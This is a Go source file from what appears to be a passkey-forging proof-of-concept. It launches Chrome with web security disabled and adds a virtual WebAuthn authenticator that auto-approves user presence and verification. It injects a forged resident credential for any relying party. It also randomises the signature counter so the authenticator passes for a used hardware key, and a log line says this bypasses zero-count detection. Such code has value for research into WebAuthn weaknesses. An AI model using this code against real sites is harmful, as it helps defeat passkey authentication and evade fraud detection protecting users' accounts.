package browser

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"forging-passkeys-poc/pkg/ctap"
	"log"
	"math/big"
	"time"

	"github.com/chromedp/cdproto/webauthn"
	"github.com/chromedp/chromedp"
)

type VirtualAuthenticator struct {
	allocatorCancel context.CancelFunc
	ctxCancel       context.CancelFunc
	ctx             context.Context
	authenticatorID webauthn.AuthenticatorID
	ctapAuth        *ctap.Authenticator
}

func New(headless bool) (*VirtualAuthenticator, error) {
	var opts []chromedp.ExecAllocatorOption
	
	if headless {
		opts = append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Headless,
			chromedp.Flag("remote-debugging-port", "9222"),
		)
	} else {
		opts = []chromedp.ExecAllocatorOption{
			chromedp.NoSandbox,
			chromedp.Flag("remote-debugging-port", "9222"),
			chromedp.Flag("disable-web-security", ""),
			chromedp.Flag("disable-features", "VizDisplayCompositor"),
			chromedp.Flag("no-first-run", ""),
			chromedp.Flag("no-default-browser-check", ""),
			chromedp.Flag("disable-background-timer-throttling", ""),
			chromedp.Flag("disable-backgrounding-occluded-windows", ""),
			chromedp.Flag("disable-renderer-backgrounding", ""),
			chromedp.WindowSize(1200, 800),
			chromedp.Flag("new-window", ""),
			chromedp.Flag("disable-gpu", "false"),
		}
	}

	allocatorCtx, allocatorCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	ctx, ctxCancel := chromedp.NewContext(allocatorCtx)

	ctapAuth := ctap.NewAuthenticator()

	var authenticatorID webauthn.AuthenticatorID
	options := &webauthn.VirtualAuthenticatorOptions{
		Protocol:                    webauthn.AuthenticatorProtocolCtap2,
		Transport:                   webauthn.AuthenticatorTransportUsb,
		HasResidentKey:              true,
		HasUserVerification:         true,
		AutomaticPresenceSimulation: true,
		IsUserVerified:              true,
	}

	if err := chromedp.Run(ctx, webauthn.Enable().WithEnableUI(true)); err != nil {
		chromedp.Cancel(ctx)
		chromedp.Cancel(allocatorCtx)
		return nil, fmt.Errorf("failed to enable WebAuthn: %w", err)
	}

	if err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
		var err error
		authenticatorID, err = webauthn.AddVirtualAuthenticator(options).Do(ctx)
		if err != nil {
			return fmt.Errorf("could not add virtual authenticator: %w", err)
		}
		return nil
	})); err != nil {
		chromedp.Cancel(ctx)
		chromedp.Cancel(allocatorCtx)
		return nil, fmt.Errorf("failed to create virtual authenticator: %w", err)
	}

	if err := chromedp.Run(ctx,
		webauthn.SetAutomaticPresenceSimulation(authenticatorID, true),
		webauthn.SetUserVerified(authenticatorID, true),
	); err != nil {
		chromedp.Cancel(ctx)
		chromedp.Cancel(allocatorCtx)
		return nil, fmt.Errorf("failed to configure virtual authenticator: %w", err)
	}

	return &VirtualAuthenticator{
		allocatorCancel: allocatorCancel,
		ctxCancel:       ctxCancel,
		ctx:             ctx,
		authenticatorID: authenticatorID,
		ctapAuth:        ctapAuth,
	}, nil
}

func (va *VirtualAuthenticator) PreloadCredential(rpid string) error {
	privateKey, err := ctap.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %w", err)
	}


	credID := make([]byte, 16)
	copy(credID, []byte("testcred12345678")[:16])
	userID := []byte("testuser12345678")

	initialSignCount := va.generateRealisticSignCount()
	cred := &ctap.Credential{
		ID:         credID,
		PrivateKey: privateKey,
		RPID:       rpid,
		UserID:     userID,
		SignCount:  initialSignCount,
		CreatedAt:  time.Now(),
	}
	va.ctapAuth.StoreCredential(rpid, cred)
	
	log.Printf("[+] sign counter spoofing: %d (bypasses the zero sign detection)", initialSignCount)


	pkcs8Key, err := ctap.MarshalPKCS8PrivateKey(privateKey)
	if err != nil {
		return fmt.Errorf("failed to marshal private key: %w", err)
	}


	credential := &webauthn.Credential{
		CredentialID:         base64.StdEncoding.EncodeToString(credID),
		PrivateKey:           base64.StdEncoding.EncodeToString(pkcs8Key),
		RpID:                 rpid,
		IsResidentCredential: true,
		SignCount:            int64(initialSignCount),
		UserHandle:           base64.StdEncoding.EncodeToString(userID),
	}
	
	log.Printf("[-]   chrome injection: %d (matches ctap authenticator)", initialSignCount)

	if err := chromedp.Run(va.ctx, webauthn.AddCredential(va.authenticatorID, credential)); err != nil {
		return fmt.Errorf("failed to inject credential into Chrome: %w", err)
	}

	return nil
}

func (va *VirtualAuthenticator) Navigate(url string) error {
	if err := chromedp.Run(va.ctx, chromedp.Navigate(url)); err != nil {
		return fmt.Errorf("failed to navigate to %s: %w", url, err)
	}
	
	time.Sleep(2 * time.Second)
	
	return nil
}



// Context returns the chromedp context for running further actions.
func (va *VirtualAuthenticator) Context() context.Context {
	return va.ctx
}

// generateRealisticSignCount creates a believable sign count for credential injection
// Mimics hardware authenticators that may have been used before
func (va *VirtualAuthenticator) generateRealisticSignCount() uint32 {
	// Hardware authenticators often have non-zero sign counts due to:
	// - Factory testing
	// - Previous usage
	// - Internal operations
	// Generate a realistic range: 0-200 with bias toward lower numbers
	
	// 60% chance of 0-10 (new-ish authenticator)
	if va.randomChance(60) {
		n, _ := rand.Int(rand.Reader, big.NewInt(11))
		return uint32(n.Int64())
	}
	
	// 30% chance of 11-50 (moderately used)
	if va.randomChance(75) { // 30% of remaining 40%
		n, _ := rand.Int(rand.Reader, big.NewInt(40))
		return uint32(n.Int64() + 11)
	}
	
	// 10% chance of 51-200 (well-used authenticator)
	n, _ := rand.Int(rand.Reader, big.NewInt(150))
	return uint32(n.Int64() + 51)
}

// randomChance returns true with given percentage probability
func (va *VirtualAuthenticator) randomChance(percentage float64) bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(10000))
	return float64(n.Int64()) < percentage*100
}

// Close cleans up the browser instance and context.
func (va *VirtualAuthenticator) Close() {
	log.Println("cleaning up virtual authenticator...")
	va.ctxCancel()
	va.allocatorCancel()
	log.Println("virtual authenticator cleanup completed")
} 